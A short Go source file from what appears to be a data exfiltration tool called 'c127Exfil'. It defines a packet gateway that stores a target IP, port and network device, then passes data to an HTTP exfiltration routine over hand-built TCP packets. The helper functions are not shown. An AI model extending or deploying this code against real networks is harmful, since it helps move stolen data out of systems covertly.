package main

// Packet Gateway structure
type PacketGateway struct {
	port         int
	ip           string
	netDevice    string
	eof          bool
	seqNum       string
	dataToBeSent []byte
	forwarder    bool
	strip        bool
}

// Default entry point for sending packets in c127Exfil
func (pg *PacketGateway) SendPacket(port int, ip string, data []byte, netDevice string, eof bool, seqNum string, fwrd bool, strip bool) {

	// Configure Vars
	pg.port = port
	pg.ip = ip
	pg.dataToBeSent = data
	pg.netDevice = netDevice
	pg.eof = eof
	pg.seqNum = seqNum
	pg.forwarder = fwrd
	pg.strip = strip

	// Identify the Protocol for the Port
	protocol := mapProtocolByPort(port)

	// Handle for each protocol
	if protocol == "HTTP" {
		pg.SendPacketHTTP()
		pg.Reset()
	}

}

// Handle the HTTP Packets being Sent.
func (pg *PacketGateway) SendPacketHTTP() {
	SendHTTPExfil(BuildBaseTCPPacket(pg.ip, pg.netDevice, pg.port), pg.dataToBeSent, pg.eof, pg.seqNum, pg.forwarder)
}

//Reset the PacketGateway
func (pg *PacketGateway) Reset() {
	pg.port = 0
	pg.ip = ""
	pg.dataToBeSent = []byte{}
}
